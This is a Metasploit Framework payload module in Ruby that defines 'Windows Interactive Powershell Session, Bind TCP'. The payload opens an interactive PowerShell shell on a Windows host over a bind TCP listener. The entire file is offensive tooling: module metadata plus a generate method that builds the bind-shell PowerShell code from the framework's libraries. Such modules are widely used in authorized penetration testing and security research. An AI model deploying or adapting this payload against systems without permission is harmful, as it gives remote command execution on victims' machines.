##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'rex/powershell'

module MetasploitModule

  CachedSize = :dynamic

  include Msf::Payload::Single
  include Rex::Powershell::Command
  include Msf::Payload::Windows::Powershell

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Windows Interactive Powershell Session, Bind TCP',
      'Description'   => 'Interacts with a powershell session on an established socket connection',
      'Author'        => [
          'Ben Turner', # benpturner
          'Dave Hardy' # davehardy20
        ],
      'References'    => [
          ['URL', 'https://blog.nettitude.com/uk/interactive-powershell-session-via-metasploit']
        ],
      'License'       => MSF_LICENSE,
      'Platform'      => 'windows',
      'Arch'          => ARCH_CMD,
      'Handler'       => Msf::Handler::BindTcp,
      'Session'       => Msf::Sessions::PowerShell,
      'RequiredCmd'   => 'generic',
      'Payload'       => { 'Payload' => '' }
      ))
  end

  def generate(_opts = {})
    generate_powershell_code("Bind")
  end
end
